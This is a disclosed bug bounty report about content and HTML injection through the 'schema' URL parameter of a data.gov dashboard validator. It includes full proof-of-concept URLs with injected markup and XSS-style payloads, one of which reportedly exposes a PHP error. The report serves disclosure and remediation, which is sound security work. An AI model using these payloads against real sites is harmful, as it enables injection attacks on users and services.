# Content injection via URL parameter.

## Report Details
- **Report ID**: 263913
- **URL**: https://hackerone.com/reports/263913
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-08-28T10:48:54.517Z
- **Disclosed**: 2020-02-08T07:45:19.519Z

## Reporter
- **Username**: johnh4x0r
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gsa_bbp

## Vulnerability Information
Hello,

The following URL is vulnerable to content & code injection.

https://labs.data.gov/dashboard/validate

https://labs.data.gov/dashboard/validate?schema=federal-v1.1&output=browser&datajson_url=https%3A%2F%2Flabs.data.gov%2Fdashboard%2Ftest%2Cjson&qa=true&as_sfid=AAAAAAX9aAk4zbcmVPVmNqK8IsF4fTqp5MWg0dD5EUW_RUCLRfQy-tInawCjs5MguiO4r0s2DOxw7A6eFsyDLtE7VwB-dOBSvwUCyh8ZDcmwEgXTbAhd65RVagmnyBes3N9JTgo%3D&as_fid=6351beaa742e567d719465625c857fb4af3647b5


The schema parameter in the above URL is vulnerable to injection.

Example...

https://labs.data.gov/dashboard/validate?schema=test%3C/td%3E%3C/table%3E%3Ctable%3E%3Cbr%3E%3CIMG/SRC=%220%22%3E%3Ca+href=%22test%22%3EThis%20is%20a%20test%20code%20injected%3C/a%3E%3Ctr%20height=1000%3E&output=browser&datajson_url=https%3A%2F%2Flabs.data.gov%2Fdashboard%2Fvalidate&qa=true&as_sfid=AAAAAAUed3Nkn6QD8xXFoaXpXFo15KAcBtnXLB2sMi3sDQg56-En7xzPW-DkRPCwWwWWr72IB5MBYVnBw5VdRcZ3mf6t0KCdTCE1Ubo8_xdNn8bT62h84O-zg4KswH-QCyULoN0%3D&as_fid=18ac90d3c3c43ee6b696ad0376dcceda949b51be


Also injecting something like <IMG/SRC="JaVaScrip<script>T:alert(%27XSS%27)"> revels PHP source error msg....

https://labs.data.gov/dashboard/validate?schema=test%3C/td%3E%3C/table%3E%3Ctable%3E%3Cbr%3E%3CIMG/SRC=%22JaVaScrip%3Cscript%3ET:alert(%27XSS%27)%22%3E%3Ca+href=%22test%22%3Etest%3C/a%3E%3CIMG/SRC=%22javascript:alert(1);%22%3E%3Ctr%20height=1000%3E&output=browser&datajson_url=https%3A%2F%2Flabs.data.gov%2Fdashboard%2Fvalidate&qa=true&as_sfid=AAAAAAUed3Nkn6QD8xXFoaXpXFo15KAcBtnXLB2sMi3sDQg56-En7xzPW-DkRPCwWwWWr72IB5MBYVnBw5VdRcZ3mf6t0KCdTCE1Ubo8_xdNn8bT62h84O-zg4KswH-QCyULoN0%3D&as_fid=18ac90d3c3c43ee6b696ad0376dcceda949b51be


The schema parameter in the URL should be further sanitised from characters like " < > /.







## Attachments
No attachments
